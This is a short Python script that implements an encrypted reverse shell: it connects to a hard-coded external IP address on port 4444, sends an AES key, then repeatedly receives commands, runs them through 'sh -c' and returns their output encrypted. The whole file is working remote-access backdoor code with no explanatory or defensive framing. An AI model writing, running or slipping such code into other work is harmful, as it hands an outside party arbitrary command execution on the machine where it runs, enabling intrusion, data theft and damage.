from Crypto.Cipher import AES
from secrets import token_bytes
from time import sleep
import socket
import struct
import subprocess

key = token_bytes(32)

def enc_send(sock, msg):
    nonce = token_bytes(12)
    aes = AES.new(key, AES.MODE_GCM, nonce)
    enc_msg = aes.encrypt(msg)
    sock.sendall(struct.pack('<Q', len(enc_msg)))
    sock.sendall(enc_msg)
    sock.sendall(nonce)

def enc_recv(sock):
    nbytes = struct.unpack('<Q', sock.recv(8))[0]
    enc_msg = sock.recv(nbytes)
    nonce = sock.recv(12)
    aes = AES.new(key, AES.MODE_GCM, nonce)
    return aes.decrypt(enc_msg)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('3.83.112.42', 4444))
    sock.setblocking(True)
    sock.sendall(key)
    
    while True:
        cmd = enc_recv(sock)
        print(cmd)
        if cmd == b'disconnect':
            return
        try:
            out = subprocess.check_output(['sh', '-c', cmd])
        except:
            out = b'command failed'
        enc_send(sock, out)


if __name__ == "__main__":
    main()
